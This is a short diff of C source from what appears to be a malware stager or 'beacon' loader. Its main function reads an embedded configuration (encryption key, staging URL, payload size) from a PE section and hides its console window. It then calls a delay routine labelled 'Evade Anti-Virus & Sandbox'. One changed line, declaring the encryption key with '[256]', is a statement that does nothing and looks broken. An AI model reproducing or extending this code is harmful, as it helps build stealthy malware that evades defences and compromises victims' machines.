@@ -29,20 +29,19 @@ BOOL Cleanup() { // Cleans up memory and handles
 int main(void) {
     Beacon->Config.ChunkCount = 0;
     Beacon->Config.EncryptionMethod = 0;
-    Beacon->Config.EncryptionKey = 0x00;
+    Beacon->Config.EncryptionKey[256];
     Beacon->Config.PayloadSize = 0;
     Beacon->Config.StagingURL = NULL;
     PVOID pPayloadBuffer = NULL;
 
     ParsePESection();
 
-    /* // TODO Will be part of --debug
-    printf("Payload Size %lu\n", Beacon->Config.PayloadSize);
+    /*
+    printf("Payload Size %zd\n", Beacon->Config.PayloadSize);
+    printf("Encryption Method %d\n", Beacon->Config.EncryptionMethod);
     printf("Encryption Key %s\n", Beacon->Config.EncryptionKey);
     printf("Staging URL %s\n", Beacon->Config.StagingURL);;
-    printf("Chunk Count %lu\n", Beacon->Config.PayloadSize);
     */
-
     if (!LoadAPI()) {
         return FALSE;
     }
@@ -50,6 +49,7 @@ int main(void) {
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
     FreeConsole();
+
     // Evade Anti-Virus & Sandbox
     DelayProgramExecution(0.3);
 
